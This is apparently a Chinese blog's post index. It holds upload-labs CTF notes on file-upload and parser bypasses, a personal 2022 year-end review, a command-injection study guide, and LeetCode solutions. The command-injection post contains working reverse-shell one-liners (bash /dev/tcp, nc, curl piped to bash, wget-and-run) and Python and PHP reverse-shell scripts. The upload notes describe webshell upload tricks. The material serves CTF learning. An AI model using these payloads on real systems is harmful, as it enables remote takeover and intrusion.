\npass5一样可以利用\n因为它取的是在.之后的数据\n那么我们可以构造.php.xxx\n也可以写成.php. . \npass6它是匹配不是正则\n所以我们可以利用.php空格空格空格\n这样的方式来进行操作\npass7$file_ext = strrchr($file_name, &#x27;.&#x27;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空\n\n黑名单很多情况下都没什么用处\n加.就可以去掉 特别是利用&#96;.php.空格空格.\n方法二：利用Windows解析漏洞（后缀修改为1.php:1.jpg）\n文件解析部分一、IIS 5.x&#x2F;6.0解析漏洞(03)IIS 6.0解析利用方法有两种\n1.目录解析\n&#x2F;xx.asp&#x2F;xx.jpg\n在网站下简历文件夹为.asp、.asa的文件夹，其目录内的任何文件扩展名的文件都会被IIS当做asp文件来执行\n例如目录 hahaha.asp，那么&#x2F;hahaha.asp&#x2F;1.jpg 一个jpg格式的文件就会被当做asp脚本文件来解析执行，假设黑客可以控制问上传文件的文件夹路径，就可以绕过上传格式拿到shell\n一般目录解析漏洞跟编辑器搭配利用，比如ckfinder，fck编辑器，都是可以创建目录的。\n2.文件解析（；）\nhahaha.asp;.jpg\n在IIS6.0下，分号后面的不被解析，也就是说hahaha.asp;.jpg会被服务器看成是hahaha.asp\n3.畸形后缀名解析IIS6.0 默认的可执行文件除了asp还包含这三种(特定的情况下被解析）：\n&#x2F;hahaha.asa&#x2F;hahaha.cer&#x2F;hahaha.cdx\n二、IIS 7.0&#x2F;IIS 7.5&#x2F; Nginx &lt;8.03畸形解析漏洞Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的…\n在默认Fast-CGI开启状况下,黑阔上传一个名字为hahaha.jpg，内容为： ‘);?&gt;的文件，然后访问hahaha.jpg&#x2F;.php,在这个目录下就会生成一句话木马 shell.php。(这个漏洞貌似不是容器的漏洞，而是php的漏洞，因为不止IIS7,0&#x2F;7.5才有，甚至10.0也有出现)\n三、Nginx &lt;8.03 空字节代码执行漏洞影响版:0.5.,0.6., 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37\nNginx在图片中嵌入PHP代码然后通过访问\nxxx.jpg.php\n来执行其中的代码\n四、Apache解析漏洞Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.\n比如 hahaha.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把hahaha.php.owf.rar解析成php.\n如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个hahaha.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀\n五、其他在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。\n我们刚刚就是一直用这个方式\n如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:\nSetHandler application&#x2F;x-httpd-php\n然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件\npass8$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, &#x27;.&#x27;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = trim($file_ext); //首尾去\n\n这个也是这样 就是去掉了文件末尾第一个点\n那么我们可以变为.php.  .   .\n那么我们就可以使用\n.php::$DATA进行绕过\n部分知识特殊文件名绕过比如发送的 http包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式在windows系统里是不被允许的，所以需要在 burp之类里进行修改，然后绕过验证后，会被windows系统自动去掉后面的点和空格，但要注意Unix/Linux系统没有这个特性。\n\nWindows流特性绕过php在window的时候如果文件名+&quot;::DATA&quot;会把::DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::DATA之后的数据当成文件流处理,不会检测后缀名.&quot;::DATA&quot;之前的文件名保持 他的目的就是不检查后缀名。ps:只能是Windows系统，并且只能时php文件\n\npass9$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, &#x27;.&#x27;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空\n\n还是点空点操作\npass10$deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $file_name)) &#123;    $img_path = $UPLOAD_ADDR . &#x27;/&#x27; .$file_name;    $is_upload = true;&#125;\n\n这里看到是把php变为空\n并没有正则或者判断存在\n所以正常的双写绕过\n.phphpp直接绕过over\npass11$ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);$file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);if(in_array($file_ext,$ext_arr))&#123;    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];    $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;    if(move_uploaded_file($temp_file,$img_path))&#123;        $is_upload = true;    &#125;\n\n终于到白名单了\n这道题目的利用点在于$_GET传参这里，我们的目录是可动态构造的\n那么我们这里使用$_GET[&#39;save_path&#39;]=/../upload/liduoan.php%00\n可是这里有限制\n需要两个条件\nphp版本小于5.3.4\nphp的magic_quotes_gpc为OFF状态\n如果要完成这一个题目就必须要实现上面的两个条件\n但是现在都PHP7了，这东西也就很少见了，满足上面的条件的时候php就是把它当成结束符，后面的数据直接忽略，这也导致了很多的问题，文件包含也可以利用这一点。\npass12$ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);   $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);   if(in_array($file_ext,$ext_arr))&#123;       $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];       $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;       if(move_uploaded_file($temp_file,$img_path))&#123;           $is_upload = true;       &#125;\n\n这道题目就是改成了$_POST传参数\n和前面那道题目一样\n上传图片马后为如下\n\n然后在上面的upload 的后面加上 XXX.php+（这里的XXX可以为任何名字，他只是一个代号。并且 php后面的 + 好也是一个标记，他的二进制代码为 2b）\n\n由上可知，将二进制中的 + 改为 00 截断，即将 + 的二进制码 2b 改为 00 .\n\npass13function getReailFileType($filename)&#123;    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin);        $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]);        $fileType = &#x27;&#x27;;        switch($typeCode)&#123;              case 255216:                        $fileType = &#x27;jpg&#x27;;            break;        case 13780:                        $fileType = &#x27;png&#x27;;            break;                case 7173:                        $fileType = &#x27;gif&#x27;;            break;        default:                        $fileType = &#x27;unknown&#x27;;        &#125;            return $fileType;&#125;\n\n这道题目，它查看了图片的内容，我们利用幻术头绕过\n但是写到这我就不会了\n结果居然是我们自己写个文件包含。。。\n&lt;?php\tinclude($_GET[&#x27;page&#x27;]);?&gt;\n\n这样我们就可以直接\n/include.php/?page=xxxxxx.jpg\n说明了图片马要么利用解析漏洞，要么利用文件包含\npass14同样幻术头马上传配合文件包含\n","categories":["安全"]},{"title":"2022年终总结","url":"/2023/01/14/2023/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","content":"2022年总结\n世之奇伟、瑰怪，非常之观，常在于险远，而人之所罕至焉，故非有志者不能至也。\n\n在今年之前，我都是一个学生，无论从思想还是行为，总是想着\n我没完成任务也没有什么吧，我还刚刚来呢，还没毕业呢，还有好多好多的退路呢。\n虽然偶尔有激动、兴奋的想法，但是也不会持续性的，努力的为之奋斗，以惫懒的态度度过每一天。\n但是今年之后，好像有什么改变。\n持续性的幸福我常常在思考，如何将生活过的有意义。但是意义本身是没有意义 的。\n我需要去寻找，什么东西是我想要的，什么是我期待的。同时也去寻找怎样能够获得我想要的东西。\n听起来很虚对不对？我也这么认为，虚的东西只能够定下大方向、而具体的东西需要沿着大方向去寻找。\n我暂时的思路是持续性的学习，持续性的积极、不会惫懒和昏沉。\n我询问过人工智能：该如何提高幸福度？\n他告诉我：\n\n学会放松、每天的生活中要坚持放松、强调精神健康，用更大的容量去体验生活\n和朋友们联系：与朋友们进行定期的交流、可以消除孤独感\n多参与各种活动：多参加一些自己感兴趣的活动，参与者会对此保持热情，从而提升快乐感受\n多锻炼：锻炼又处于改善心理状态、增强体能，提升幸福度。\n\n发现了吗？他的答案实际上全是如何让精神更为富足，更为稳定和放松。\n寻求精神上的解脱，其实和将生活过的有意义是一样的。我需要做的只是让自己快乐，不是低级的、快餐式的快乐。而是一种持续性的、精神上的幸福。\n在十一月之前，我并没有上述清晰的概念，我的理解上只是：如果我开心我就去做。\n2022今年的主旋律是毕业和工作。\n今年一月份拿到offer，二月份去实习。\n老板给我的感官还是不错的，实习的体验上也很好，有同事全程帮助我解决了各种问题。在这个实习上，我觉得我的整体思想和工作经验都比腾讯时得到了更大的成长。其中有实习时长的原因，也有具体业务的原因。\n在大规模、合作式的项目迭代中，需求增长中、数据分析中，我确实更加的明白了一个开发工程师应该有的基本素养。这其实就是工作上成长了，在这里就不细说，简而言之，数据才是对开发而言更为重要的东西，功能的完成并不复杂，设计模式的掌握更为重要，思考的边界和限制在整体的大局上需要充分的把控。\n二月到六月都在实习中度过、期间由于疫情的原因，不能够回到学校毕业，没有见到sjx、也没有见到舍友们，但是我也明白其实大家见面的次数会越来越少，只是没有好好的告别总给我一种没有毕业的错觉，没有完成精神上的阶段结束。为此我准备23年去南京逛逛，结束我的记忆。\n同时在这个时间段内，也完成了我的毕业论文，非常幸运的认识到了我的导师、非常负责，也很有耐心，帮助我顺利的毕业。说实话，感觉写论文没啥意思，代码上的感知不够好，非工程类的代码给我的激励没有很强。尤其是我不准备读研的情况下，这个更加没啥意思了hh。\n 六月到七月在家里休息，同时和好朋友们约了毕业旅行，整体上非常开心，和朋友们的见面能够给我带来精神上的快乐。我还是想和朋友们能够再次的去旅行！!\n之后就继续工作了呜呜呜。工作的内容上其实不难，主要是思路清晰，能够完成相应的需求更迭。\n之后到现在我感觉都挺平淡的，写需求、建看板、搞数据、玩游戏。\n看书与学习今年看的书不算多，但是是高中毕业后第一次去重新的阅读非小说类书籍\n今年阅读的书有\n《打开一颗心》\n《蛤蟆先生去看心理医生》\n《小岛经济学》\n很少，但是总比没有好，如此也能够有对应的数据查看进步。\n此外技术类的书籍没有很多，大部分都是Android的博客、书籍等。\n这一栏是我目前无法写很多的东西，希望今年多看一些书吧，经济、社科、生活之类的。\n岁岁年年一般来说，最后都是对未来的展望\n对于23年，我希望的是精神上能够拥有正常的兴奋和激励，能够阅读更多的书，思想上能有更为深刻的见识。\n此外，我希望能够和我的朋友们再聚一聚，能够彼此间的友谊和感情继续下去\n很喜欢小方的一句话，如果不主动去见的话，没有那么多有缘再见的\n"},{"title":"命令执行-总结1.0","url":"/2020/04/08/CTFcomig/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%80%BB%E7%BB%931-0/","content":"2020.04.08现在在上马原课。不是很想听，或者说根本不想听。\n刚好看到了合天的一个公众号写了命令注入的总结。\n我想着，就花点时间写写看√\n首先，我想说说命令注入的重要性。\n命令注入，很多时候都需要使用到，我做过的题目里好多都是利用命令注入的。\n可以说是基础的东西吧！基础很重要。\n有一说一其实就那几个函数使用。\n首先区分命令注入和远程代码执行\n命令注入是调用了系统的命令。\n\n\n远程代码执行是利用代码在服务器中执行。但是就我而言，我觉得两者是相关的。\n命令执行原理：\n  在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令\n代码执行原理：\n 调用一些执行系统命令的函数，如PHP中的system、exec、assert、shell_exec、passthru、popen、pcntl_exec等。\n当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行，这就是命令执行漏洞。以上函数主要也在webshell中用的多，实际上在正常应用中差别不太大，用得最多的还是几个而已。\n所以介绍介绍用的最多的函数叭！【干巴得 马原老师太捞了！\n\n看到没！ system会自己显示输出的！\n\nexec函数就不会自动自己显示输出了。需要我们认为调用函数\necho()、var_dump()等等\n\n下面是一些和上面比更有趣的函数\n\n这个函数是做过一道题目的！所以详细说说这个函数\n如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。\n记住！是当成php代码！不是当成系统命令！\n\n这个又得说到了正则表达式。它是怎么利用的呢？\nemm说实话，我理解的不深，还是不献丑了\n大家先知道，存在这个方式的代码执行\n参考：https://xz.aliyun.com/t/2557\n当然还有很多有意思的函数可以进行命令执行。\n在我们找到函数后，去利用的时候，经常会对参数进行过滤。\n那么我们需要绕过它。【怎么绕过？？…\n补充： 反引号可以进行命令执行\n一般来说：绕过方式无非\n1、禁用函数\n2、过滤字符\n禁用函数的我不懂，先放着。\n说说过滤字符\n过滤了空格:用哪些代替？ 【要耐心，有时候不是都可以成功\n1、 &lt;2、$&#123;IFS&#125;3、$IFS$94、%09\n\n这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，只有cat$IFSa.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离  –源自合天智汇\n过滤了某些截断符号：\n$ ; | (  )  `(反引号)  ||  &amp;&amp; &amp; &#125;  &#123;  %0a\n\n利用Base64编码绕过【我暂时还没遇到过\nroot@kali: echo &#x27;cat&#x27; | base64Y2F0Cg==root@kali: echo &#x27;Y2F0Cg==&#x27; | base64 -d \n\n用单引号绕过特定字符\n\n动态调用：\nPHP中允许动态调用函数比如说：\n&lt;?php$fun = &quot;system&quot;;$fun($_GET[&#x27;cmd&#x27;]);?&gt;\n\n那么在我们可以利用多个变量，动态组成字符串绕过过滤√\n好了，终于到了我最不会的反弹shell了\n这个我服气。老多问题了。但是理清楚一点点了。\n周五早上写清楚。\n\n首先要搞清楚什么是反弹，为什么要反弹。假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。\n那么什么情况下正向连接不太好用了呢？1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。2.由于防火墙等限制，对方机器只能发送请求，不能接收请求。3.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。\n那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。\n此处源自：https://www.zhihu.com/question/24503813/answer/102253018\n在CTF中，我们是使目标机访问我们的服务器，然后访问我们预先写好的代码。\n这也目标机会反弹自己的shell到我们的服务器了。\n典型的是：https://www.gem-love.com/ctf/2097.html#DuangShell\n下面copy一下一位师傅的博客：https://www.jianshu.com/p/9456473a0a14\n最近在做ctf题时碰到一些命令执行题借用命令执行来反弹shell，这里记录一下。\n1.bash反弹shell个人感觉bash反弹是最简单、也是最常见的一种。\nbash -i &gt;&amp; /dev/tcp/192.168.20.151/8080 0&gt;&amp;1\n\nbash一句话命令详解 以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下。\n\n 其实以上bash反弹一句完整的解读过程就是：\nbash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。 在反弹shell时要借助netcat工具反弹\nNetcat 一句话反弹：Netcat反弹也是非常常用的方法，只是这个方法需要我们手动去安装一个NC环境\n开启外网主机监听\nroot@kali:~# nc -lvvp 8080listening on [any] 8080 ...\n\nkali : 192.168.20.151 centos：192.168.20.130\n先用kali开启监听： 然后centos执行bash一句话。\n\n\n成功反弹。\n2.netcat 一句话反弹~  nc 192.168.31.151 7777 -t  /bin/bash 命令详解：通过webshell我们可以使用nc命令直接建立一个tcp 8080 的会话连接，然后将本地的bash通过这个会话连接反弹给目标主机（192.168.31.151）。\n\n先开启监听7777端口。\n\n\n\n交互式反弹\n3.curl反弹shell前提要利用bash一句话的情况下使用curl反弹shell\n在存在命令执行的服务器上执行curl ip|bash，该ip的index文件上含有bash一句话，就可以反弹shell。\n例如在自己的服务器index上写上一句话\nbash -i &gt;&amp; /dev/tcp/192.168.20.151/7777 0&gt;&amp;1\n\n192.168.20.151就是作为监听端口的服务器用来得到反弹的shell。\n\n存在一句话，利用curl反弹。 kali开启监听\n\n\n4.wget方式反弹利用wget进行下载执行\n\nwget 192.168.20.130&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php\n\n利用下面贴出的php进行反弹。 开启监听\n\n\n成功反弹shell\n5.其他脚本反弹python反弹开启kail监听\n\n\n反弹成功。 py脚本\n#!/usr/bin/python#-*- coding: utf-8 -*-import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;192.168.20.151&quot;,7777)) #更改localhost为自己的外网ip,端口任意os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])\n\nphp反弹开启kail监听端口，\n\n\n成功反弹，不过这里要将php保存成txt文件进行反弹，若为php文件不会反弹成功。 php脚本：\n&lt;?php$sock=fsockopen(&quot;192.168.20.151&quot;,7777);//localhost为自己的外网ip，端口任意exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);?&gt;\n\n反弹shell我大致上了解了。但是很浅薄。\n等我又遇到这样的题目再说叭。\n","categories":["安全"]},{"title":"leetcode_01_part","url":"/2020/04/26/Leetcode_%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/leetcode-01-week/","content":"2020.04.2623. 合并K个排序链表难度困难610\n合并 k 个排序链表，返回合并后的排序链表。请分析和描述算法的复杂度。\n\n\n示例:\n输入:[  1-&gt;4-&gt;5,  1-&gt;3-&gt;4,  2-&gt;6]输出: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6\n\n正常对两个链表排序\n下图是我以前写的基本算法训练\n然后递归就是了，所以最差版本就是下面了\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:\t//这里就是标准的两个链表进行有序化为一个链表    ListNode* sortLists(ListNode* l1,ListNode * l2)    &#123;        ListNode * head = new ListNode(0);        ListNode * pre = head;        while(l1!=NULL&amp;&amp;l2!=NULL)        &#123;            if(l1-&gt;val &gt; l2-&gt;val)&#123;                pre-&gt;next=l2;                pre=l2;                l2=l2-&gt;next;            &#125;            else&#123;                pre-&gt;next=l1;                pre=l1;                l1=l1-&gt;next;            &#125;        &#125;        if(l1==NULL)&#123;            pre-&gt;next=l2;        &#125;        else&#123;            pre-&gt;next=l1;        &#125;        return head-&gt;next;    &#125;    ListNode* mergeKLists(vector&lt;ListNode*&gt;&amp; lists) &#123;        //这里如果输入为空        if(lists.size()==0)            return NULL;                ListNode* res=lists[0];        for(int i=1;i&lt;lists.size();i++)&#123;            res = sortLists(res, lists[i]);        &#125;        return res;    &#125;&#125;;\n\n很明显的做法不是吗？\n然而有更好的做法，\n优化-1分治合并\n复习下分治算法：\n把一个难以解决的问题分解成规模较小的相似问题，分而治之。\n子问题要求分割到最小最小！\n那么我们分析下 可以看成  合并两个最链表 这两个链表又可以分成四个小链表，以此类推….\n好的，那么我们大致思路为： 先把链表分割 然后从最小链表开始合并 自底向上，逐渐到最顶层。\n代码如下：\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:\t//核心合并两个链表    ListNode* sortLists(ListNode* l1,ListNode * l2)    &#123;        ListNode * head = new ListNode(0);        ListNode * pre = head;        while(l1!=NULL&amp;&amp;l2!=NULL)        &#123;            if(l1-&gt;val &gt; l2-&gt;val)&#123;                pre-&gt;next=l2;                pre=l2;                l2=l2-&gt;next;            &#125;            else&#123;                pre-&gt;next=l1;                pre=l1;                l1=l1-&gt;next;            &#125;        &#125;        if(l1==NULL)&#123;            pre-&gt;next=l2;        &#125;        else&#123;            pre-&gt;next=l1;        &#125;        return head-&gt;next;    &#125;\t//分割的函数 在内部存在合并  分治法要求在最小子问题出    //再向顶前进    ListNode * spitList(vector&lt;ListNode*&gt;&amp; lists,int left,int right)&#123;        if(left==right)            return lists[left];        if(left&gt;right)            return NULL;        int mid = (left+right)/2;        return sortLists(spitList(lists,left,mid),spitList(lists,mid+1,right));    &#125;    ListNode* mergeKLists(vector&lt;ListNode*&gt;&amp; lists) &#123;        if(lists.size()==0)            return NULL;        return spitList(lists,0,lists.size()-1);    &#125;&#125;;\n\n还有一种利用优先队列的方法。这里就不说了。【还是太菜\n2020.04.28I. 数组中数字出现的次数一个整型数组 nums 里除两个数字之外，其他数字都出现了两次。请写程序找出这两个只出现一次的数字。要求时间复杂度是O(n)，空间复杂度是O(1)。\n示例 1：输入：nums = [4,1,4,6]输出：[1,6] 或 [6,1]示例 2：输入：nums = [1,2,10,4,1,4,3,3]输出：[2,10] 或 [10,2]\n\n分析：\n知识点： 异或 按位与运算\t\n首先我们先回忆一下 异或运算(  ^  ) 和按位与运算(  &amp;  )的规则\n异或：相同为0  不同为1\n按位与：有0为0  全1为1\n异或和加法\n异或和按位与\n附上两篇关于异或和按位与的文章\n具体说说这个\n我们首先知道，如何解决下面这个问题\n如果除了一个数字以外，其他数字都出现了两次，那么如何找到出现一次的数字？\n可以全体异或，最终得到的值就是这个数字。仔细体会下异或就明白了。相同为0\n而0任意异或都为其本身。\n那么我们这里有两个不同的数字。可以分割成两个上述的问题。那么关键在于如何准确分割？\n首先我们全体异或 得到的是最终两个不同数字的异或值。那么我们拿取这个异或值的某一个不为0的位。把这个位和这两个数字按位与，最终得到的是分割开的。\n比如说： 最终异或： 0111     而 两个不一样的数字 1和6  其位为：0001  0110\n那么我们利用最终异或的最后一个1来进行判断  就是0001  依次和\n0001  0110 相互按位与  前者是1 后者是0 所以就分开啦。这样我们就可以分成两组来全异或。\n所以代码就顺势写出来了。\n理一遍思路\n1、全部异或得到两个不同数字的异或值\n2、取这个异或值的不为0的最低位\n3、重新遍历 依次按位与分割\n4、分割的途中对每一个异或  得到最终解\nclass Solution &#123;public:    vector&lt;int&gt; singleNumbers(vector&lt;int&gt;&amp; nums) &#123;        int ret=0;        for(int n: nums)&#123;            ret ^=n;        &#125;        int div = 1;        //把我们异或的最终结果 拿出不为0的位出来        while((div&amp;ret)==0)  //有0为0 全1为1        &#123;            div&lt;&lt;=1;        &#125;        int a = 0;        int b = 0;        for(int n:nums)&#123;            if(div&amp;n)&#123;                a^=n;            &#125;            else&#123;                b^=n;            &#125;        &#125;        return vector&lt;int&gt;&#123;a,b&#125;;    &#125;&#125;;\n\n2020.04.291095. 山脉数组中查找目标值（这是一个 交互式问题 ）\n给你一个 山脉数组 mountainArr，请你返回能够使得 mountainArr.get(index) 等于 target 最小 的下标 index 值。\n如果不存在这样的下标 index，就请返回 -1。\n何为山脉数组？如果数组 A 是一个山脉数组的话，那它满足如下条件：\n首先，A.length &gt;&#x3D; 3\n其次，在 0 &lt; i &lt; A.length - 1 条件下，存在 i 使得：\nA[0] &lt; A[1] &lt; … A[i-1] &lt; A[i]A[i] &gt; A[i+1] &gt; … &gt; A[A.length - 1]\n你将 不能直接访问该山脉数组，必须通过 MountainArray 接口来获取数据：\nMountainArray.get(k) - 会返回数组中索引为k 的元素（下标从 0 开始）MountainArray.length() - 会返回该数组的长度\n注意：\n对 MountainArray.get 发起超过 100 次调用的提交将被视为错误答案。此外，任何试图规避判题系统的解决方案都将会导致比赛资格被取消。\n为了帮助大家更好地理解交互式问题，我们准备了一个样例 “答案”：https://leetcode-cn.com/playground/RKhe3ave，请注意这 不是一个正确答案。\n示例 1：\n输入：array &#x3D; [1,2,3,4,5,3,1], target &#x3D; 3输出：2解释：3 在数组中出现了两次，下标分别为 2 和 5，我们返回最小的下标 2。示例 2：\n输入：array &#x3D; [0,1,2,4,2,1], target &#x3D; 3输出：-1解释：3 在数组中没有出现，返回 -1。\n提示：\n3 &lt;&#x3D; mountain_arr.length() &lt;&#x3D; 100000 &lt;&#x3D; target &lt;&#x3D; 10^90 &lt;&#x3D; mountain_arr.get(index) &lt;&#x3D; 10^9通过次数10,429提交次数28,914\n\n分析：\n很明显，这应该是我们先进行二分，在进行两个二分最终得到最终答案\n注意到，二分算法的时间复杂度是O(log n)\n下面是二分查找的一个详细的博文:\n二分查找1. 分析二分查找代码时，不要出现 else，全部展开成 else if 方便理解。\n2. 注意「搜索区间」和 while 的终止条件，如果存在漏掉的元素，记得在最后检查。\n3. 如需要搜索左右边界，只要在 nums[mid] &#x3D;&#x3D; target 时做修改即可。搜索右侧时需要减一。\n就算遇到其他的二分查找变形，运用这几点技巧，也能保证你写出正确的代码。LeetCode Explore 中有二分查找的专项练习，其中提供了三种不同的代码模板，现在你再去看看，很容易就知道这几个模板的实现原理了。\n下面说下具体想法：\n首先我们二分查找到整个山脉数组的最大值——利用二分查找\n我们得到这个最大值的时候，就可以把这个山脉数组分割成两个数组\n一个是递增数组\t一个是递减数组\n我们依次在两个数组中进行二分查找\nemmm基础前备知识已经有了，那么代码就来了\n代码如下/** * // This is the MountainArray&#x27;s API interface. * // You should not implement it, or speculate about its implementation * class MountainArray &#123; *   public: *     int get(int index); *     int length(); * &#125;; */class Solution &#123;public:    int findInMountainArray(int target, MountainArray &amp;mountainArr) &#123;        int l = 0; int r = mountainArr.length()-1;        while(l&lt;r)&#123;//这里确定《= 意味着是在空区间的时候出循环            //我想找出最大值，最好是            int mid = ( l+ r)/2;            //如果我取等 会在这里卡住            if(mountainArr.get(mid)&gt;mountainArr.get(mid+1))&#123;                r=mid;            &#125;else&#123;                l = mid +1;            &#125;        &#125;        int div = l;        int xl=mountainArr.get(l);        if(xl&lt;mountainArr.get(l+1))&#123;            div=l+1;        &#125;        if(mountainArr.get(div-1)&gt;xl)&#123;            div = div -1;        &#125;        //获得峰值        //开始两个二分        int res =  getTheValue(target,mountainArr,0,div);        if(res != -1)&#123;            return res;        &#125;        res = getOtherValue(target,mountainArr,div+1,mountainArr.length()-1);        if(res != -1)&#123;            return res;        &#125;        return -1;    &#125;\t//这里是递增二分查找    int getTheValue(int target, MountainArray &amp;mountainArr,int left, int right)&#123;                        while(left&lt;=right)&#123;//注意                int mid = (left+right)/2;                int value = mountainArr.get(mid);                if(value==target)                    return mid;                else if(value&gt;target)&#123;                    right = mid -1;                &#125;                else if(value&lt;target)&#123;                    left = mid +1;                &#125;            &#125;            return -1;    &#125;    //这里是递减二分查找    int getOtherValue(int target, MountainArray &amp;mountainArr,int left, int right)&#123;                        while(left&lt;=right)&#123;                int mid = (left+right)/2;                int value = mountainArr.get(mid);                if(value==target)                    return mid;                else if(value&gt;target)&#123;                    left = mid + 1;                &#125;                else if(value&lt;target)&#123;                    right = mid - 1;                &#125;            &#125;            return -1;    &#125;&#125;;\n\n2020.04.30202. 快乐数编写一个算法来判断一个数 n 是不是快乐数。\n「快乐数」定义为：对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和，然后重复这个过程直到这个数变为 1，也可能是 无限循环 但始终变不到 1。如果 可以变为  1，那么这个数就是快乐数。\n如果 n 是快乐数就返回 True ；不是，则返回 False 。\n示例：\n输入：19输出：true解释：12 + 92 &#x3D; 8282 + 22 &#x3D; 6862 + 82 &#x3D; 10012 + 02 + 02 &#x3D; 1\n\n这道题目 